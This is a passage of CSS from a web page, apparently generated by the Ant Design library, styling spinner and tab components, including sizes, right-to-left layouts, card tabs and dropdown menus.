    .css-1ymq82w.ant-spin .ant-spin-dot-spin {
        transform: rotate(45deg);
        animation-name: css-1ymq82w-antRotate;
        animation-duration: 1.2s;
        animation-iteration-count: infinite;
        animation-timing-function: linear;
    }

    .css-1ymq82w.ant-spin-sm .ant-spin-dot {
        font-size: 14px;
    }

    .css-1ymq82w.ant-spin-sm .ant-spin-dot i {
        width: 6px;
        height: 6px;
    }

    .css-1ymq82w.ant-spin-lg .ant-spin-dot {
        font-size: 32px;
    }

    .css-1ymq82w.ant-spin-lg .ant-spin-dot i {
        width: 14px;
        height: 14px;
    }

    .css-1ymq82w.ant-spin.ant-spin-show-text .ant-spin-text {
        display: block;
    }
</style>
<style>
    .css-1ymq82w[class^="ant-tabs"],
    .css-1ymq82w[class*=" ant-tabs"] {
        font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, 'Noto Sans', sans-serif, 'Apple Color Emoji', 'Segoe UI Emoji', 'Segoe UI Symbol', 'Noto Color Emoji';
        font-size: 14px;
        box-sizing: border-box;
    }

    .css-1ymq82w[class^="ant-tabs"]::before,
    .css-1ymq82w[class*=" ant-tabs"]::before,
    .css-1ymq82w[class^="ant-tabs"]::after,
    .css-1ymq82w[class*=" ant-tabs"]::after {
        box-sizing: border-box;
    }

    .css-1ymq82w[class^="ant-tabs"] [class^="ant-tabs"],
    .css-1ymq82w[class*=" ant-tabs"] [class^="ant-tabs"],
    .css-1ymq82w[class^="ant-tabs"] [class*=" ant-tabs"],
    .css-1ymq82w[class*=" ant-tabs"] [class*=" ant-tabs"] {
        box-sizing: border-box;
    }

    .css-1ymq82w[class^="ant-tabs"] [class^="ant-tabs"]::before,
    .css-1ymq82w[class*=" ant-tabs"] [class^="ant-tabs"]::before,
    .css-1ymq82w[class^="ant-tabs"] [class*=" ant-tabs"]::before,
    .css-1ymq82w[class*=" ant-tabs"] [class*=" ant-tabs"]::before,
    .css-1ymq82w[class^="ant-tabs"] [class^="ant-tabs"]::after,
    .css-1ymq82w[class*=" ant-tabs"] [class^="ant-tabs"]::after,
    .css-1ymq82w[class^="ant-tabs"] [class*=" ant-tabs"]::after,
    .css-1ymq82w[class*=" ant-tabs"] [class*=" ant-tabs"]::after {
        box-sizing: border-box;
    }

    .css-1ymq82w.ant-tabs-small>.ant-tabs-nav .ant-tabs-tab {
        padding: 8px 0;
        font-size: 14px;
    }

    .css-1ymq82w.ant-tabs-large>.ant-tabs-nav .ant-tabs-tab {
        padding: 16px 0;
        font-size: 16px;
    }

    .css-1ymq82w.ant-tabs-card.ant-tabs-small>.ant-tabs-nav .ant-tabs-tab {
        padding: 6px 16px;
    }

    .css-1ymq82w.ant-tabs-card.ant-tabs-small.ant-tabs-bottom>.ant-tabs-nav .ant-tabs-tab {
        border-radius: 0 0 6px 6px;
    }

    .css-1ymq82w.ant-tabs-card.ant-tabs-small.ant-tabs-top>.ant-tabs-nav .ant-tabs-tab {
        border-radius: 6px 6px 0 0;
    }

    .css-1ymq82w.ant-tabs-card.ant-tabs-small.ant-tabs-right>.ant-tabs-nav .ant-tabs-tab {
        border-radius: 0 6px 6px 0;
    }

    .css-1ymq82w.ant-tabs-card.ant-tabs-small.ant-tabs-left>.ant-tabs-nav .ant-tabs-tab {
        border-radius: 6px 0 0 6px;
    }

    .css-1ymq82w.ant-tabs-card.ant-tabs-large>.ant-tabs-nav .ant-tabs-tab {
        padding: 8px 16px 6px;
    }

    .css-1ymq82w.ant-tabs-rtl {
        direction: rtl;
    }

    .css-1ymq82w.ant-tabs-rtl .ant-tabs-nav .ant-tabs-tab {
        margin: 0 0 0 32px;
    }

    .css-1ymq82w.ant-tabs-rtl .ant-tabs-nav .ant-tabs-tab .ant-tabs-tab:last-of-type {
        margin-left: 0;
    }

    .css-1ymq82w.ant-tabs-rtl .ant-tabs-nav .ant-tabs-tab .anticon {
        margin-right: 0;
        margin-left: 12px;
    }

    .css-1ymq82w.ant-tabs-rtl .ant-tabs-nav .ant-tabs-tab .ant-tabs-tab-remove {
        margin-right: 8px;
        margin-left: -4px;
    }

    .css-1ymq82w.ant-tabs-rtl .ant-tabs-nav .ant-tabs-tab .ant-tabs-tab-remove .anticon {
        margin: 0;
    }

    .css-1ymq82w.ant-tabs-rtl.ant-tabs-left>.ant-tabs-nav {
        order: 1;
    }

    .css-1ymq82w.ant-tabs-rtl.ant-tabs-left>.ant-tabs-content-holder {
        order: 0;
    }

    .css-1ymq82w.ant-tabs-rtl.ant-tabs-right>.ant-tabs-nav {
        order: 0;
    }

    .css-1ymq82w.ant-tabs-rtl.ant-tabs-right>.ant-tabs-content-holder {
        order: 1;
    }

    .css-1ymq82w.ant-tabs-rtl.ant-tabs-card.ant-tabs-top>.ant-tabs-nav .ant-tabs-tab+.ant-tabs-tab,
    .css-1ymq82w.ant-tabs-rtl.ant-tabs-card.ant-tabs-bottom>.ant-tabs-nav .ant-tabs-tab+.ant-tabs-tab,
    .css-1ymq82w.ant-tabs-rtl.ant-tabs-card.ant-tabs-top>div>.ant-tabs-nav .ant-tabs-tab+.ant-tabs-tab,
    .css-1ymq82w.ant-tabs-rtl.ant-tabs-card.ant-tabs-bottom>div>.ant-tabs-nav .ant-tabs-tab+.ant-tabs-tab {
        margin-right: 2px;
        margin-left: 0;
    }

    .css-1ymq82w.ant-tabs-dropdown-rtl {
        direction: rtl;
    }

    .css-1ymq82w.ant-tabs-menu-item .ant-tabs-dropdown-rtl {
        text-align: right;
    }

    .css-1ymq82w.ant-tabs-top,
    .css-1ymq82w.ant-tabs-bottom {
        flex-direction: column;
    }

    .css-1ymq82w.ant-tabs-top>.ant-tabs-nav,
    .css-1ymq82w.ant-tabs-bottom>.ant-tabs-nav,
    .css-1ymq82w.ant-tabs-top>div>.ant-tabs-nav,
    .css-1ymq82w.ant-tabs-bottom>div>.ant-tabs-nav {
        margin: 0 0 16px 0;
    }

    .css-1ymq82w.ant-tabs-top>.ant-tabs-nav::before,
    .css-1ymq82w.ant-tabs-bottom>.ant-tabs-nav::before,
    .css-1ymq82w.ant-tabs-top>div>.ant-tabs-nav::before,
    .css-1ymq82w.ant-tabs-bottom>div>.ant-tabs-nav::before {
        position: absolute;
        right: 0;
        left: 0;
        border-bottom: 1px solid rgba(5, 5, 5, 0.06);
        content: '';
    }

    .css-1ymq82w.ant-tabs-top>.ant-tabs-nav .ant-tabs-ink-bar,
    .css-1ymq82w.ant-tabs-bottom>.ant-tabs-nav .ant-tabs-ink-bar,
    .css-1ymq82w.ant-tabs-top>div>.ant-tabs-nav .ant-tabs-ink-bar,
    .css-1ymq82w.ant-tabs-bottom>div>.ant-tabs-nav .ant-tabs-ink-bar {
        height: 2px;
    }

    .css-1ymq82w.ant-tabs-top>.ant-tabs-nav .ant-tabs-ink-bar-animated,
    .css-1ymq82w.ant-tabs-bottom>.ant-tabs-nav .ant-tabs-ink-bar-animated,
    .css-1ymq82w.ant-tabs-top>div>.ant-tabs-nav .ant-tabs-ink-bar-animated,
    .css-1ymq82w.ant-tabs-bottom>div>.ant-tabs-nav .ant-tabs-ink-bar-animated {
        transition: width 0.3s, left 0.3s, right 0.3s;
    }

    .css-1ymq82w.ant-tabs-top>.ant-tabs-nav .ant-tabs-nav-wrap::before,
    .css-1ymq82w.ant-tabs-bottom>.ant-tabs-nav .ant-tabs-nav-wrap::before,
    .css-1ymq82w.ant-tabs-top>div>.ant-tabs-nav .ant-tabs-nav-wrap::before,
    .css-1ymq82w.ant-tabs-bottom>div>.ant-tabs-nav .ant-tabs-nav-wrap::before,
    .css-1ymq82w.ant-tabs-top>.ant-tabs-nav .ant-tabs-nav-wrap::after,
    .css-1ymq82w.ant-tabs-bottom>.ant-tabs-nav .ant-tabs-nav-wrap::after,
    .css-1ymq82w.ant-tabs-top>div>.ant-tabs-nav .ant-tabs-nav-wrap::after,
    .css-1ymq82w.ant-tabs-bottom>div>.ant-tabs-nav .ant-tabs-nav-wrap::after {
        top: 0;
        bottom: 0;
        width: 32px;
    }

    .css-1ymq82w.ant-tabs-top>.ant-tabs-nav .ant-tabs-nav-wrap::before,
    .css-1ymq82w.ant-tabs-bottom>.ant-tabs-nav .ant-tabs-nav-wrap::before,
    .css-1ymq82w.ant-tabs-top>div>.ant-tabs-nav .ant-tabs-nav-wrap::before,
    .css-1ymq82w.ant-tabs-bottom>div>.ant-tabs-nav .ant-tabs-nav-wrap::before {
        left: 0;
        box-shadow: inset 10px 0 8px -8px rgba(0, 0, 0, 0.08);
    }

    .css-1ymq82w.ant-tabs-top>.ant-tabs-nav .ant-tabs-nav-wrap::after,
    .css-1ymq82w.ant-tabs-bottom>.ant-tabs-nav .ant-tabs-nav-wrap::after,
    .css-1ymq82w.ant-tabs-top>div>.ant-tabs-nav .ant-tabs-nav-wrap::after,
    .css-1ymq82w.ant-tabs-bottom>div>.ant-tabs-nav .ant-tabs-nav-wrap::after {
        right: 0;
        box-shadow: inset -10px 0 8px -8px rgba(0, 0, 0, 0.08);
    }

    .css-1ymq82w.ant-tabs-top>.ant-tabs-nav .ant-tabs-nav-wrap.ant-tabs-nav-wrap-ping-left::before,
    .css-1ymq82w.ant-tabs-bottom>.ant-tabs-nav .ant-tabs-nav-wrap.ant-tabs-nav-wrap-ping-left::before,
    .css-1ymq82w.ant-tabs-top>div>.ant-tabs-nav .ant-tabs-nav-wrap.ant-tabs-nav-wrap-ping-left::before,
    .css-1ymq82w.ant-tabs-bottom>div>.ant-tabs-nav .ant-tabs-nav-wrap.ant-tabs-nav-wrap-ping-left::before {
        opacity: 1;
    }

    .css-1ymq82w.ant-tabs-top>.ant-tabs-nav .ant-tabs-nav-wrap.ant-tabs-nav-wrap-ping-right::after,
    .css-1ymq82w.ant-tabs-bottom>.ant-tabs-nav .ant-tabs-nav-wrap.ant-tabs-nav-wrap-ping-right::after,
    .css-1ymq82w.ant-tabs-top>div>.ant-tabs-nav .ant-tabs-nav-wrap.ant-tabs-nav-wrap-ping-right::after,
    .css-1ymq82w.ant-tabs-bottom>div>.ant-tabs-nav .ant-tabs-nav-wrap.ant-tabs-nav-wrap-ping-right::after {
        opacity: 1;
    }

    .css-1ymq82w.ant-tabs-top>.ant-tabs-nav::before,
    .css-1ymq82w.ant-tabs-top>div>.ant-tabs-nav::before {
        bottom: 0;
    }

    .css-1ymq82w.ant-tabs-top>.ant-tabs-nav .ant-tabs-ink-bar,
    .css-1ymq82w.ant-tabs-top>div>.ant-tabs-nav .ant-tabs-ink-bar {
        bottom: 0;
    }

    .css-1ymq82w.ant-tabs-bottom>.ant-tabs-nav,
    .css-1ymq82w.ant-tabs-bottom>div>.ant-tabs-nav {
        order: 1;
        margin-top: 16px;
        margin-bottom: 0;
    }

    .css-1ymq82w.ant-tabs-bottom>.ant-tabs-nav::before,
    .css-1ymq82w.ant-tabs-bottom>div>.ant-tabs-nav::before {
        top: 0;
    }

    .css-1ymq82w.ant-tabs-bottom>.ant-tabs-nav .ant-tabs-ink-bar,
    .css-1ymq82w.ant-tabs-bottom>div>.ant-tabs-nav .ant-tabs-ink-bar {
        top: 0;
    }

    .css-1ymq82w.ant-tabs-bottom>.ant-tabs-content-holder,
    .css-1ymq82w.ant-tabs-bottom>div>.ant-tabs-content-holder {
        order: 0;
    }

    .css-1ymq82w.ant-tabs-left>.ant-tabs-nav,
    .css-1ymq82w.ant-tabs-right>.ant-tabs-nav,
    .css-1ymq82w.ant-tabs-left>div>.ant-tabs-nav,
    .css-1ymq82w.ant-tabs-right>div>.ant-tabs-nav {
        flex-direction: column;
        min-width: 40px;
    }

    .css-1ymq82w.ant-tabs-left>.ant-tabs-nav .ant-tabs-tab,
    .css-1ymq82w.ant-tabs-right>.ant-tabs-nav .ant-tabs-tab,
    .css-1ymq82w.ant-tabs-left>div>.ant-tabs-nav .ant-tabs-tab,
    .css-1ymq82w.ant-tabs-right>div>.ant-tabs-nav .ant-tabs-tab {
        padding: 8px 24px;
        text-align: center;
    }

    .css-1ymq82w.ant-tabs-left>.ant-tabs-nav .ant-tabs-tab+.ant-tabs-tab,
    .css-1ymq82w.ant-tabs-right>.ant-tabs-nav .ant-tabs-tab+.ant-tabs-tab,
    .css-1ymq82w.ant-tabs-left>div>.ant-tabs-nav .ant-tabs-tab+.ant-tabs-tab,
    .css-1ymq82w.ant-tabs-right>div>.ant-tabs-nav .ant-tabs-tab+.ant-tabs-tab {
        margin: 16px 0 0 0;
    }

    .css-1ymq82w.ant-tabs-left>.ant-tabs-nav .ant-tabs-nav-wrap,
    .css-1ymq82w.ant-tabs-right>.ant-tabs-nav .ant-tabs-nav-wrap,
    .css-1ymq82w.ant-tabs-left>div>.ant-tabs-nav .ant-tabs-nav-wrap,
    .css-1ymq82w.ant-tabs-right>div>.ant-tabs-nav .ant-tabs-nav-wrap {
        flex-direction: column;
    }

    .css-1ymq82w.ant-tabs-left>.ant-tabs-nav .ant-tabs-nav-wrap::before,
    .css-1ymq82w.ant-tabs-right>.ant-tabs-nav .ant-tabs-nav-wrap::before,
    .css-1ymq82w.ant-tabs-left>div>.ant-tabs-nav .ant-tabs-nav-wrap::before,
    .css-1ymq82w.ant-tabs-right>div>.ant-tabs-nav .ant-tabs-nav-wrap::before,
    .css-1ymq82w.ant-tabs-left>.ant-tabs-nav .ant-tabs-nav-wrap::after,
    .css-1ymq82w.ant-tabs-right>.ant-tabs-nav .ant-tabs-nav-wrap::after,
    .css-1ymq82w.ant-tabs-left>div>.ant-tabs-nav .ant-tabs-nav-wrap::after,
    .css-1ymq82w.ant-tabs-right>div>.ant-tabs-nav .ant-tabs-nav-wrap::after {
        right: 0;
        left: 0;
        height: 32px;
    }

    .css-1ymq82w.ant-tabs-left>.ant-tabs-nav .ant-tabs-nav-wrap::before,
    .css-1ymq82w.ant-tabs-right>.ant-tabs-nav .ant-tabs-nav-wrap::before,
    .css-1ymq82w.ant-tabs-left>div>.ant-tabs-nav .ant-tabs-nav-wrap::before,
    .css-1ymq82w.ant-tabs-right>div>.ant-tabs-nav .ant-tabs-nav-wrap::before {
        top: 0;
        box-shadow: inset 0 10px 8px -8px rgba(0, 0, 0, 0.08);
    }

    .css-1ymq82w.ant-tabs-left>.ant-tabs-nav .ant-tabs-nav-wrap::after,
    .css-1ymq82w.ant-tabs-right>.ant-tabs-nav .ant-tabs-nav-wrap::after,
    .css-1ymq82w.ant-tabs-left>div>.ant-tabs-nav .ant-tabs-nav-wrap::after,
    .css-1ymq82w.ant-tabs-right>div>.ant-tabs-nav .ant-tabs-nav-wrap::after {
        bottom: 0;
        box-shadow: inset 0 -10px 8px -8px rgba(0, 0, 0, 0.08);
    }

    .css-1ymq82w.ant-tabs-left>.ant-tabs-nav .ant-tabs-nav-wrap.ant-tabs-nav-wrap-ping-top::before,
    .css-1ymq82w.ant-tabs-right>.ant-tabs-nav .ant-tabs-nav-wrap.ant-tabs-nav-wrap-ping-top::before,
    .css-1ymq82w.ant-tabs-left>div>.ant-tabs-nav .ant-tabs-nav-wrap.ant-tabs-nav-wrap-ping-top::before,
    .css-1ymq82w.ant-tabs-right>div>.ant-tabs-nav .ant-tabs-nav-wrap.ant-tabs-nav-wrap-ping-top::before {
        opacity: 1;
    }

    .css-1ymq82w.ant-tabs-left>.ant-tabs-nav .ant-tabs-nav-wrap.ant-tabs-nav-wrap-ping-bottom::after,
    .css-1ymq82w.ant-tabs-right>.ant-tabs-nav .ant-tabs-nav-wrap.ant-tabs-nav-wrap-ping-bottom::after,
    .css-1ymq82w.ant-tabs-left>div>.ant-tabs-nav .ant-tabs-nav-wrap.ant-tabs-nav-wrap-ping-bottom::after,
    .css-1ymq82w.ant-tabs-right>div>.ant-tabs-nav .ant-tabs-nav-wrap.ant-tabs-nav-wrap-ping-bottom::after {
        opacity: 1;
    }

    .css-1ymq82w.ant-tabs-left>.ant-tabs-nav .ant-tabs-ink-bar,
    .css-1ymq82w.ant-tabs-right>.ant-tabs-nav .ant-tabs-ink-bar,
    .css-1ymq82w.ant-tabs-left>div>.ant-tabs-nav .ant-tabs-ink-bar,
    .css-1ymq82w.ant-tabs-right>div>.ant-tabs-nav .ant-tabs-ink-bar {
        width: 2px;
    }

    .css-1ymq82w.ant-tabs-left>.ant-tabs-nav .ant-tabs-ink-bar-animated,
    .css-1ymq82w.ant-tabs-right>.ant-tabs-nav .ant-tabs-ink-bar-animated,
    .css-1ymq82w.ant-tabs-left>div>.ant-tabs-nav .ant-tabs-ink-bar-animated,
    .css-1ymq82w.ant-tabs-right>div>.ant-tabs-nav .ant-tabs-ink-bar-animated {
        transition: height 0.3s, top 0.3s;
    }

    .css-1ymq82w.ant-tabs-left>.ant-tabs-nav .ant-tabs-nav-list,
    .css-1ymq82w.ant-tabs-right>.ant-tabs-nav .ant-tabs-nav-list,
    .css-1ymq82w.ant-tabs-left>div>.ant-tabs-nav .ant-tabs-nav-list,
    .css-1ymq82w.ant-tabs-right>div>.ant-tabs-nav .ant-tabs-nav-list,
    .css-1ymq82w.ant-tabs-left>.ant-tabs-nav .ant-tabs-nav-operations,
    .css-1ymq82w.ant-tabs-right>.ant-tabs-nav .ant-tabs-nav-operations,
    .css-1ymq82w.ant-tabs-left>div>.ant-tabs-nav .ant-tabs-nav-operations,
    .css-1ymq82w.ant-tabs-right>div>.ant-tabs-nav .ant-tabs-nav-operations {
        flex: 1 0 auto;
        flex-direction: column;
    }

    .css-1ymq82w.ant-tabs-left>.ant-tabs-nav .ant-tabs-ink-bar,
    .css-1ymq82w.ant-tabs-left>div>.ant-tabs-nav .ant-tabs-ink-bar {
        right: 0;
    }

    .css-1ymq82w.ant-tabs-left>.ant-tabs-content-holder,
    .css-1ymq82w.ant-tabs-left>div>.ant-tabs-content-holder {
        margin-left: -1px;
        border-left: 1px solid #d9d9d9;
    }

    .css-1ymq82w.ant-tabs-left>.ant-tabs-content-holder>.ant-tabs-content>.ant-tabs-tabpane,
    .css-1ymq82w.ant-tabs-left>div>.ant-tabs-content-holder>.ant-tabs-content>.ant-tabs-tabpane {
        padding-left: 24px;
    }

    .css-1ymq82w.ant-tabs-right>.ant-tabs-nav,
    .css-1ymq82w.ant-tabs-right>div>.ant-tabs-nav {
        order: 1;
    }

    .css-1ymq82w.ant-tabs-right>.ant-tabs-nav .ant-tabs-ink-bar,
    .css-1ymq82w.ant-tabs-right>div>.ant-tabs-nav .ant-tabs-ink-bar {
        left: 0;
    }

    .css-1ymq82w.ant-tabs-right>.ant-tabs-content-holder,
    .css-1ymq82w.ant-tabs-right>div>.ant-tabs-content-holder {
        order: 0;
        margin-right: -1px;
        border-right: 1px solid #d9d9d9;
    }

    .css-1ymq82w.ant-tabs-right>.ant-tabs-content-holder>.ant-tabs-content>.ant-tabs-tabpane,
    .css-1ymq82w.ant-tabs-right>div>.ant-tabs-content-holder>.ant-tabs-content>.ant-tabs-tabpane {
        padding-right: 24px;
    }

    .css-1ymq82w.ant-tabs-dropdown {
        box-sizing: border-box;
        margin: 0;
        padding: 0;
        color: rgba(0, 0, 0, 0.88);
        font-size: 14px;
        line-height: 1.5714285714285714;
        list-style: none;
        font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, 'Noto Sans', sans-serif, 'Apple Color Emoji', 'Segoe UI Emoji', 'Segoe UI Symbol', 'Noto Color Emoji';
        position: absolute;
        top: -9999px;
        left: -9999px;
        z-index: 1050;
        display: block;
    }

    .css-1ymq82w.ant-tabs-dropdown-hidden {
        display: none;
    }

    .css-1ymq82w.ant-tabs-dropdown .ant-tabs-dropdown-menu {
        max-height: 200px;
        margin: 0;
        padding: 4px 0;
        overflow-x: hidden;
        overflow-y: auto;
        text-align: left;
        list-style-type: none;
        background-color: #ffffff;
        background-clip: padding-box;
        border-radius: 8px;
        outline: none;
        box-shadow: 0 1px 2px 0 rgba(0, 0, 0, 0.03), 0 1px 6px -1px rgba(0, 0, 0, 0.02), 0 2px 4px 0 rgba(0, 0, 0, 0.02);
    }

    .css-1ymq82w.ant-tabs-dropdown .ant-tabs-dropdown-menu-item {
        overflow: hidden;
        white-space: nowrap;
        text-overflow: ellipsis;
        display: flex;
        align-items: center;
        min-width: 120px;
        margin: 0;
        padding: 4px 12px;
        color: rgba(0, 0, 0, 0.88);
        font-weight: normal;
        font-size: 14px;
        line-height: 1.5714285714285714;
        cursor: pointer;
        transition: all 0.3s;
    }

    .css-1ymq82w.ant-tabs-dropdown .ant-tabs-dropdown-menu-item>span {
        flex: 1;
        white-space: nowrap;
    }

    .css-1ymq82w.ant-tabs-dropdown .ant-tabs-dropdown-menu-item-remove {
        flex: none;
        margin-left: 12px;
        color: rgba(0, 0, 0, 0.45);
        font-size: 12px;
        background: transparent;
        border: 0;
        cursor: pointer;
    }

    .css-1ymq82w.ant-tabs-dropdown .ant-tabs-dropdown-menu-item-remove:hover {
        color: #4096ff;
    }

    .css-1ymq82w.ant-tabs-dropdown .ant-tabs-dropdown-menu-item:hover {
        background: rgba(0, 0, 0, 0.04);
    }

    .css-1ymq82w.ant-tabs-dropdown .ant-tabs-dropdown-menu-item-disabled,
    .css-1ymq82w.ant-tabs-dropdown .ant-tabs-dropdown-menu-item-disabled:hover {
        color: rgba(0, 0, 0, 0.25);
        background: transparent;
        cursor: not-allowed;
    }

    .css-1ymq82w.ant-tabs-card>.ant-tabs-nav .ant-tabs-tab,
    .css-1ymq82w.ant-tabs-card>div>.ant-tabs-nav .ant-tabs-tab {
        margin: 0;
        padding: 8px 16px;
        background: rgba(0, 0, 0, 0.02);
        border: 1px solid rgba(5, 5, 5, 0.06);
        transition: all 0.3s cubic-bezier(0.645, 0.045, 0.355, 1);
    }

    .css-1ymq82w.ant-tabs-card>.ant-tabs-nav .ant-tabs-tab-active,
    .css-1ymq82w.ant-tabs-card>div>.ant-tabs-nav .ant-tabs-tab-active {
        color: #1677ff;
        background: #ffffff;
    }

    .css-1ymq82w.ant-tabs-card>.ant-tabs-nav .ant-tabs-ink-bar,
    .css-1ymq82w.ant-tabs-card>div>.ant-tabs-nav .ant-tabs-ink-bar {
        visibility: hidden;
    }

    .css-1ymq82w.ant-tabs-card.ant-tabs-top>.ant-tabs-nav .ant-tabs-tab+.ant-tabs-tab,
    .css-1ymq82w.ant-tabs-card.ant-tabs-bottom>.ant-tabs-nav .ant-tabs-tab+.ant-tabs-tab,
    .css-1ymq82w.ant-tabs-card.ant-tabs-top>div>.ant-tabs-nav .ant-tabs-tab+.ant-tabs-tab,
    .css-1ymq82w.ant-tabs-card.ant-tabs-bottom>div>.ant-tabs-nav .ant-tabs-tab+.ant-tabs-tab {
        margin-left: 2px;
    }

    .css-1ymq82w.ant-tabs-card.ant-tabs-top>.ant-tabs-nav .ant-tabs-tab,
    .css-1ymq82w.ant-tabs-card.ant-tabs-top>div>.ant-tabs-nav .ant-tabs-tab {
        border-radius: 8px 8px 0 0;
    }

    .css-1ymq82w.ant-tabs-card.ant-tabs-top>.ant-tabs-nav .ant-tabs-tab-active,
    .css-1ymq82w.ant-tabs-card.ant-tabs-top>div>.ant-tabs-nav .ant-tabs-tab-active {
        border-bottom-color: #ffffff;
    }

    .css-1ymq82w.ant-tabs-card.ant-tabs-bottom>.ant-tabs-nav .ant-tabs-tab,
    .css-1ymq82w.ant-tabs-card.ant-tabs-bottom>div>.ant-tabs-nav .ant-tabs-tab {
        border-radius: 0 0 8px 8px;
    }

    .css-1ymq82w.ant-tabs-card.ant-tabs-bottom>.ant-tabs-nav .ant-tabs-tab-active,
    .css-1ymq82w.ant-tabs-card.ant-tabs-bottom>div>.ant-tabs-nav .ant-tabs-tab-active {
        border-top-color: #ffffff;
    }

    .css-1ymq82w.ant-tabs-card.ant-tabs-left>.ant-tabs-nav .ant-tabs-tab+.ant-tabs-tab,
    .css-1ymq82w.ant-tabs-card.ant-tabs-right>.ant-tabs-nav .ant-tabs-tab+.ant-tabs-tab,
    .css-1ymq82w.ant-tabs-card.ant-tabs-left>div>.ant-tabs-nav .ant-tabs-tab+.ant-tabs-tab,
    .css-1ymq82w.ant-tabs-card.ant-tabs-right>div>.ant-tabs-nav .ant-tabs-tab+.ant-tabs-tab {
        margin-top: 2px;
    }

    .css-1ymq82w.ant-tabs-card.ant-tabs-left>.ant-tabs-nav .ant-tabs-tab,
    .css-1ymq82w.ant-tabs-card.ant-tabs-left>div>.ant-tabs-nav .ant-tabs-tab {
        border-radius: 8px 0 0 8px;
    }

    .css-1ymq82w.ant-tabs-card.ant-tabs-left>.ant-tabs-nav .ant-tabs-tab-active,
    .css-1ymq82w.ant-tabs-card.ant-tabs-left>div>.ant-tabs-nav .ant-tabs-tab-active {
        border-right-color: #ffffff;
    }

    .css-1ymq82w.ant-tabs-card.ant-tabs-right>.ant-tabs-nav .ant-tabs-tab,
    .css-1ymq82w.ant-tabs-card.ant-tabs-right>div>.ant-tabs-nav .ant-tabs-tab {
        border-radius: 0 8px 8px 0;
    }

    .css-1ymq82w.ant-tabs-card.ant-tabs-right>.ant-tabs-nav .ant-tabs-tab-active,
    .css-1ymq82w.ant-tabs-card.ant-tabs-right>div>.ant-tabs-nav .ant-tabs-tab-active {
        border-left-color: #ffffff;
    }

    .css-1ymq82w.ant-tabs {
        box-sizing: border-box;
        margin: 0;
        padding: 0;
        color: rgba(0, 0, 0, 0.88);
        font-size: 14px;
        line-height: 1.5714285714285714;
        list-style: none;
        font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, 'Noto Sans', sans-serif, 'Apple Color Emoji', 'Segoe UI Emoji', 'Segoe UI Symbol', 'Noto Color Emoji';
        display: flex;
    }

    .css-1ymq82w.ant-tabs>.ant-tabs-nav,
    .css-1ymq82w.ant-tabs>div>.ant-tabs-nav {
        position: relative;
        display: flex;
        flex: none;
        align-items: center;
    }

    .css-1ymq82w.ant-tabs>.ant-tabs-nav .ant-tabs-nav-wrap,
    .css-1ymq82w.ant-tabs>div>.ant-tabs-nav .ant-tabs-nav-wrap {
        position: relative;
        display: flex;
        flex: auto;
        align-self: stretch;
        overflow: hidden;
        white-space: nowrap;
        transform: translate(0);
    }

    .css-1ymq82w.ant-tabs>.ant-tabs-nav .ant-tabs-nav-wrap::before,
    .css-1ymq82w.ant-tabs>div>.ant-tabs-nav .ant-tabs-nav-wrap::before,
    .css-1ymq82w.ant-tabs>.ant-tabs-nav .ant-tabs-nav-wrap::after,
    .css-1ymq82w.ant-tabs>div>.ant-tabs-nav .ant-tabs-nav-wrap::after {
        position: absolute;
        z-index: 1;
        opacity: 0;
        transition: opacity 0.3s;
        content: '';
        pointer-events: none;
    }

    .css-1ymq82w.ant-tabs>.ant-tabs-nav .ant-tabs-nav-list,
    .css-1ymq82w.ant-tabs>div>.ant-tabs-nav .ant-tabs-nav-list {
        position: relative;
        display: flex;
        transition: opacity 0.3s;
    }

    .css-1ymq82w.ant-tabs>.ant-tabs-nav .ant-tabs-nav-operations,
    .css-1ymq82w.ant-tabs>div>.ant-tabs-nav .ant-tabs-nav-operations {
        display: flex;
        align-self: stretch;
    }

    .css-1ymq82w.ant-tabs>.ant-tabs-nav .ant-tabs-nav-operations-hidden,
    .css-1ymq82w.ant-tabs>div>.ant-tabs-nav .ant-tabs-nav-operations-hidden {
        position: absolute;
        visibility: hidden;
        pointer-events: none;
    }

    .css-1ymq82w.ant-tabs>.ant-tabs-nav .ant-tabs-nav-more,
    .css-1ymq82w.ant-tabs>div>.ant-tabs-nav .ant-tabs-nav-more {
        position: relative;
        padding: 8px 16px;
        background: transparent;
        border: 0;
    }

    .css-1ymq82w.ant-tabs>.ant-tabs-nav .ant-tabs-nav-more::after,
    .css-1ymq82w.ant-tabs>div>.ant-tabs-nav .ant-tabs-nav-more::after {
        position: absolute;
        right: 0;
        bottom: 0;
        left: 0;
        height: 5px;
        transform: translateY(100%);
        content: '';
    }

    .css-1ymq82w.ant-tabs>.ant-tabs-nav .ant-tabs-nav-add,
    .css-1ymq82w.ant-tabs>div>.ant-tabs-nav .ant-tabs-nav-add {
        min-width: 40px;
        margin-left: 2px;
        padding: 0 8px;
        background: transparent;
        border: 1px solid rgba(5, 5, 5, 0.06);
        border-radius: 8px 8px 0 0;
        outline: none;
        cursor: pointer;
        color: rgba(0, 0, 0, 0.88);
        transition: all 0.3s cubic-bezier(0.645, 0.045, 0.355, 1);
    }

    .css-1ymq82w.ant-tabs>.ant-tabs-nav .ant-tabs-nav-add:hover,
    .css-1ymq82w.ant-tabs>div>.ant-tabs-nav .ant-tabs-nav-add:hover {
        color: #4096ff;
    }

    .css-1ymq82w.ant-tabs>.ant-tabs-nav .ant-tabs-nav-add:active,
    .css-1ymq82w.ant-tabs>div>.ant-tabs-nav .ant-tabs-nav-add:active,
    .css-1ymq82w.ant-tabs>.ant-tabs-nav .ant-tabs-nav-add:focus:not(:focus-visible),
    .css-1ymq82w.ant-tabs>div>.ant-tabs-nav .ant-tabs-nav-add:focus:not(:focus-visible) {
        color: #0958d9;
    }

    .css-1ymq82w.ant-tabs>.ant-tabs-nav .ant-tabs-nav-add:focus-visible,
    .css-1ymq82w.ant-tabs>div>.ant-tabs-nav .ant-tabs-nav-add:focus-visible {
        outline: 4px solid #91caff;
        outline-offset: 1px;
        transition: outline-offset 0s, outline 0s;
    }

    .css-1ymq82w.ant-tabs .ant-tabs-extra-content {
        flex: none;
    }

    .css-1ymq82w.ant-tabs .ant-tabs-ink-bar {
        position: absolute;
        background: #1677ff;
        pointer-events: none;
    }

    .css-1ymq82w.ant-tabs .ant-tabs-tab {
        position: relative;
        display: inline-flex;
        align-items: center;
        padding: 12px 35px;
        font-size: 14px;
        background: transparent;
        border: 0;
        outline: none;
        cursor: pointer;
    }

    .css-1ymq82w.ant-tabs .ant-tabs-tab-btn:focus:not(:focus-visible),
